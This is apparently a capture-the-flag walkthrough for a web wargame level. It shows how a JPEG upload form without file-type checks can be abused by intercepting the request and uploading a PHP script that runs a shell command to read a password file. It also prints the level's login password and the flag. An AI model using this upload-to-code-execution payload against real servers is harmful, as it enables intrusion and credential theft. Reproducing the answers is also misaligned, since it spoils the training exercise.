**PW:** EDXp0pS26wLKHZy1rDBPUZk0RKfLGIR3

Upon login we are given a screen that allows uploading of JPEG files (max 1KB).
Looking at the source code, I found a few funtions that looked strange.

```
function genRandomString() {
    $length = 10;
    $characters = "0123456789abcdefghijklmnopqrstuvwxyz";
    $string = "";    

    for ($p = 0; $p < $length; $p++) {
        $string .= $characters[mt_rand(0, strlen($characters)-1)];
    }

    return $string;
}
```

This function creates a random string and returns it to:

```
function makeRandomPath($dir, $ext) {
    do {
    $path = $dir."/".genRandomString().".".$ext;
    } while(file_exists($path));
    return $path;
}
```

One interesting thing I noticed is that although the file name is being changed, there is no protection for file types.
You can upload essentially any file type.
We can use what we've learned in the past couple levels to send a PHP file to the server.

The script we will use is:
```
<?
passthru("cat /etc/natas_webpass/natas13");
?>
```

This allows us to remotely execute a ```cat``` command, and grab the natas13 password.

The only thing stopping us from doing this is this line:
```
<input type="hidden" name="filename" value="<? print genRandomString(); ?>.jpg" />
```
Which messes with our file name by appending a .jpg to the end. To circumvent this we need something like Burp Suite to intercept the file name before it is sent to the server.
After a bit of googling and playing around with Burp Suite, I was able to successfully intercept the request and change the file name to ```php_injection.php```.
I then forward the package and click on the link provided. This executes the code and returns the flag.

**Flag:** jmLTY0qiPZBbaKc9341cqPQZBJv7MQbY
